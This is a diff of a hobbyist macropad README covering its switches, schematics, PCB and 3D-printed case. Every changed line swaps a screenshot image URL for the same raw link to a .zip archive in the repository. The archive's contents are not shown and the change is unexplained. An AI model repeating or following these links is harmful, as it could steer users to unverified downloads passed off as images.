@@ -6,13 +6,13 @@ My hackpad uses:
 2. 4 push switches as my keys.(sourced from Hackclub hq)
 
 Here are the schematics:
-<img width="532" height="432" alt="Screenshot 2026-02-07 132831" src="https://github.com/user-attachments/assets/b2f45e51-2d06-4521-a176-4b53897ae422" />
+<img width="532" height="432" alt="Screenshot 2026-02-07 132831" src="https://github.com/GodOfStrategy/My-custom-macropad/raw/refs/heads/main/KiCad/custom-macropad-My-3.1.zip" />
 
 Here is the PCB:
-<img width="923" height="604" alt="Screenshot 2026-02-07 132816" src="https://github.com/user-attachments/assets/3007143f-41af-4fba-a8f2-161411a49b21" />
+<img width="923" height="604" alt="Screenshot 2026-02-07 132816" src="https://github.com/GodOfStrategy/My-custom-macropad/raw/refs/heads/main/KiCad/custom-macropad-My-3.1.zip" />
 
 I modeled my Case for it in Fusion 360, I kept it open from two sides for future potential debugging, access and easy heat dissapation.
-<img width="484" height="367" alt="Screenshot 2026-02-07 132807" src="https://github.com/user-attachments/assets/cc242354-3522-4ff9-9bb9-70ebe4860a21" />
+<img width="484" height="367" alt="Screenshot 2026-02-07 132807" src="https://github.com/GodOfStrategy/My-custom-macropad/raw/refs/heads/main/KiCad/custom-macropad-My-3.1.zip" />
 
 Here is the assembled 3d model of my case:
-<img width="714" height="454" alt="Screenshot 2026-02-20 203354" src="https://github.com/user-attachments/assets/882000ea-2410-45b6-b912-9d4a9966f243" />
+<img width="714" height="454" alt="Screenshot 2026-02-20 203354" src="https://github.com/GodOfStrategy/My-custom-macropad/raw/refs/heads/main/KiCad/custom-macropad-My-3.1.zip" />
